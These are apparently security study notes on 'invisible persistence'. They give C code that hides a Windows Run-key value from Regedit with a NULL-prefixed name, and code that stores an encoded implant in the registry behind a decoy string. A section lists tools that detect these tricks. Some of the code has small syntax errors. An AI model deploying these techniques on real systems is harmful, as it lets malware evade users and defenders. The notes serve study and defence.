# Notes: INVISIBLE PERSISTENCE
## Hiding Registry Entries (Poweliks, Kovter, others)
https://stackoverflow.com/questions/1721106/how-to-hide-a-value-on-the-registry-like-sysinternals-reghide-tool

It is possible to write a value to the Run key that Regedit will fail to display but that Windows will read properly when it checks the Run key after a reboot. 

```sh
// HIDDEN_KEY_LENGTH doesn't matter as long as it is non-zero.
// Length is needed to delete the key

define HIDDEN_KEY_LENGTH 11 
void createHiddenRunKey(const WCHAR* runCmd) { 
	LSTATUS openRet = 0; 
	NTSTATUS setRet = 0; 
	UNICODE_STRING ValueName = { 0 };
	wchar_t runkeyPath[0x100] = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
	wchar_t runkeyPath_trick[0x100] = L"\0\0SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

	if (!NtSetValueKey) { 
	HMODULE hNtdll = LoadLibraryA("ntdll.dll")0;
	NtSetValueKey = (_NtSetValueKey)GetProcAddress(hNtdll, "NtSetValueKey"); 
	} 

	ValueName.Buffer = runkeyPath_trick; 
	ValueName.Length = 2 * HIDDEN_KEY_LENGTH;
	ValueName.MaximumLength = 0; 
<break/>
	if (!(openRet = RegOpenKeyExW(HKEY_CURRENT_USER, runkeyPath, 0, KEY_SET_VALUE, &hkResult))) { 
		if (!(setRet = NtSetValueKey(hkResult, &ValueName, 0, REG_SZ, (PVOID)runCmd, wcslen(runCmd) * 2))) 
			printf("SUCCESS setting hidden run value!\n"); 
		else 
			printf("FAILURE setting hidden run value! (setRet == 0x%X, GLE() == %d)\n", setRet, GetLastError());
		RegCloseKey(hkResult); 
	}
	else {
		printf("FAILURE opening RUN key in registry! (openRet == 0x%X, GLE() == %d)\n", openRet, GetLastError()); 
	}
}
```

In the above function, NtSetValueKey is passed the UNICODE_STRING ValueName. ValueName.Buffer would typically be set to “SOFTWARE\Microsoft\Windows\CurrentVersion\Run” to set a value of the Run key. Instead, we prepend this string with two WCHAR NULLs (“\0\0”) so ValueName.Buffer is “\0\0SOFTWARE\Microsoft\Windows\CurrentVersion\Run” 

Another common place to check for programs that auto run at system startup is Task Manager. In more recent versions of Windows the “Startup” tab has been added to Task Manager. The invisible persistence technique does not add an entry to the Task Manager Startup tab. 

<break/><break/>


### FILELESS BINARY STORAGE IN THE REGISTRY

While the invisible Run key technique completely hid the value (at the cost of an error message), this fileless binary technique displays a value, but hides its contents. Just like with the first technique, the contents of the value cannot be exported by Regedit. 
```
// this writes the binary buffer of the encoded implant to the registry as a sting
// according to winnt.h, REG_SZ is "Unicode nul terminated string"
// When the value is exported, only part of the value will actually be exported.

void writeHiddenBuf(char *buf, DWORD buflen, const char *decoy, char *keyName, const char* valueName) {
 HKEY hkResult = NULL;
 BYTE *buf2 = (BYTE*)malloc(buflen + strlen(decoy) + 1);
 strcpy((char*)buf2, decoy);
 buf2[strlen(decoy)] = 0;
 memcpy(buf2 + strlen(decoy) + 1, buf, buflen);
 if (!RegOpenKeyExA(HKEY_CURRENT_USER, keyName, 0, KEY_SET_VALUE, &hkResult))
 {
 printf("Key opened!\n");
 LSTATUS lStatus = RegSetValueExA(hkResult, valueName, 0, REG_SZ, (const BYTE *)buf2, buflen + strlen(decoy) + 1);
 printf("lStatus == %d\n", lStatus);
 RegCloseKey(hkResult);
 }
 free(buf2);
}
void readHiddenBuf(BYTE **buf, DWORD *buflen, const char *decoy, char * keyName, const char* valueName) {
 HKEY hkResult = NULL;
 LONG nError = RegOpenKeyExA(HKEY_CURRENT_USER, keyName, NULL, KEY_ALL_ACCESS, &hkResult);
 RegQueryValueExA(hkResult, valueName, NULL, NULL, NULL, buflen);
 *buf = (BYTE*)malloc(*buflen);
 RegQueryValueExA(hkResult, valueName, NULL, NULL, *buf, buflen);
 RegCloseKey(hkResult);
 *buflen -= (strlen(decoy) + 1);
 BYTE *buf2 = (BYTE*)malloc(*buflen);
 memcpy(buf2, *buf + strlen(decoy) + 1, *buflen);
 free(*buf);
 *buf = buf2;
}
```
First consider writeHiddenBuf. For this example, let decoy be “(value not set)”. The hidden buffer is prepended with “(value not set)\0”. The NULL byte at the end of the string will hide whatever comes after it so that Regedit does not display or export the hidden buffer. So long as RegSetValueExA is passed the length of decoy string + the length of the hidden buffer, it will write the entire buffer to the registry. readHiddenBuf retrieves the hidden buffer from the registry and removes the decoy string from the beginning of it.

The maligned registry entry will display (value not set).  The real data can be viewed if you choose "Modify Binary Data" on the value that has the hidden buffer.


### COUNTERMEASURES

These techniques rely on errors in how Regedit reads and display registry values. Other tools do not have the same errors and can be used to verify the output of Regedit. 

***`Autoruns from Sysinternals`*** , for example, will correctly display the hidden Run key values. 

Forensics tools like ***`FTK Registry Viewer`*** can view the hidden buffers stored in values if a copy is made of the registry hives on disk. 

Because the hive files are in use while Windows is running, use a tool like ***`HoboCopy`*** to make a copy of the hive files. 

***`SysInternals’s RegDelNull`*** scans the registry for entries with embedded NULL bytes and has the option of deleting those entries. 
